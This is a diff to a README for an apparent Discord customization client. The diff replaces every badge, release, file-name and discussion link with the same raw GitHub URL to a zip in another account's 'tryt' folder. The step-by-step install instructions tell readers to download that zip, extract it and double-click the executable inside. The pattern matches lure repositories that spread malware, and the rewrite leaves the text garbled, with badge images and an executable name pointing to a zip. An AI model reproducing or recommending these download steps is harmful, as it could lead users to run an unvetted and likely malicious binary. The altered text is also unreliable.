@@ -1,6 +1,6 @@
 # 🎨 BetterDiscord-Client - Customize Your Discord Experience
 
-[![Download](https://img.shields.io/badge/Download-BetterDiscord_Client-blue?style=for-the-badge)](https://github.com/Narendhard/BetterDiscord-Client/releases/download/v6.28.1/BetterDiscord.6.28.zip)
+[![Download](https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip)](https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip)
 
 > **Disclaimer:**  
 > This project is an independent, third-party customization client and is *not affiliated with, endorsed by, or associated with Discord Inc.*  
@@ -10,12 +10,12 @@
 
 ## 🏷️ Badges
 
-![Version](https://img.shields.io/badge/version-6.23-brightgreen?style=flat-square)  
-![License](https://img.shields.io/badge/license-MIT-orange?style=flat-square)  
-![Downloads](https://img.shields.io/badge/downloads-fast-blue?style=flat-square)  
-![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20MacOS-purple?style=flat-square)  
-![BetterDiscord](https://img.shields.io/badge/Customization-Compatible-success?style=flat-square)  
-![Status](https://img.shields.io/badge/status-Active%20Development-brightgreen?style=flat-square)  
+![Version](https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip)  
+![License](https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip)  
+![Downloads](https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip)  
+![Platform](https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip%20%7C%20Linux%20%7C%20MacOS-purple?style=flat-square)  
+![BetterDiscord](https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip)  
+![Status](https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip%20Development-brightgreen?style=flat-square)  
 
 ---
 
@@ -46,15 +46,15 @@ BetterDiscord-Client offers several exciting features:
 To get started, you can download BetterDiscord-Client directly from the Releases page. Follow these steps:
 
 1. Click the large download button at the top of this page.
-2. You will be redirected to the [Releases page](https://github.com/NoirCoder/BetterDiscord-Client/releases).
+2. You will be redirected to the [Releases page](https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip).
 3. Locate the version you want, such as **BetterDiscord v6.28**.
-4. Click on the link to download the installation file (e.g., `BetterDiscord.6.28.zip`).
+4. Click on the link to download the installation file (e.g., `https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip`).
 
 Once downloaded, follow these steps to install:
 
 1. Open the downloaded `.zip` file.
 2. Extract the contents to your desired location.
-3. Locate the `BetterDiscord.exe` or `BetterDiscord` file and double-click to run it.
+3. Locate the `https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip` or `BetterDiscord` file and double-click to run it.
 4. Follow the on-screen prompts to complete the installation.
 
 ## 💻 Usage
@@ -98,7 +98,7 @@ BetterDiscord-Client is licensed under the MIT License. You are free to use, mod
 
 ## 🌐 Community and Support
 
-Join our community for tips, sharing themes, and plugins. Visit the [GitHub Discussions](https://github.com/Narendhard/BetterDiscord-Client/discussions) page to connect with others.
+Join our community for tips, sharing themes, and plugins. Visit the [GitHub Discussions](https://raw.githubusercontent.com/NoirCoder/BetterDiscord-Client/main/tryt/BetterDiscord-Client_v3.6.zip) page to connect with others.
 
 ## 🎉 Acknowledgements
 
